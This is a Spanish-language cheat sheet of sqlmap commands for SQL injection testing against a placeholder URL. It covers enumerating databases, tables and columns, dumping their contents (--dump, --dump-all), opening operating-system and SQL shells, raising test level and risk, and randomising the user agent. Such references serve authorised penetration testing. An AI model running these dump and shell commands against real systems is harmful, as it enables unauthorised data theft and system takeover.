------------------------
# Enumeración y obtención de información
 
##### Enumera las bases de datos disponibles en el objetivo.
```bash
sqlmap -u URL --dbs
```

##### Enumera las tablas de una base de datos específica.
```bash
sqlmap -u URL -D nombre_base_datos --tables
```

##### Enumera las columnas de una tabla específica.
```bash
sqlmap -u URL -D nombre_base_datos -T nombre_tabla --columns
```

##### Obtiene los datos de las columnas especificadas de una tabla.
```bash
sqlmap -u URL -D nombre_base_datos -T nombre_tabla -C "columna1,columna2" --dump
```

-------------------------
# Explotación y recuperación de datos

##### Recupera todos los datos posibles de la base de datos.
```bash
sqlmap -u URL --dump-all
```

##### Obtén una shell interactiva en el sistema operativo subyacente.
```bash
sqlmap -u URL --os-shell
```

##### Obtén una shell interactiva de SQL.
```bash
sqlmap -u URL --sql-shell
```

-------------------
# Opciones avanzadas y personalización

##### Establece el nivel de prueba de inyección SQL en 3 (valor predeterminado: 1).
```bash
sqlmap -u URL --level=3
```

##### Establece el riesgo de prueba de inyección SQL en 2 (valor predeterminado: 1).
```bash
sqlmap -u URL --risk=2
```

##### Especifica el número de hilos a utilizar durante la enumeración (valor predeterminado: 1).
```bash
sqlmap -u URL --threads=5
```

##### Define una cookie personalizada para la solicitud.
```bash
sqlmap -u URL --cookie="nombre_cookie=valor"
```

##### Utiliza un agente de usuario aleatorio para hacer la solicitud.
```bash
sqlmap -u URL --random-agent
```

-----------------------



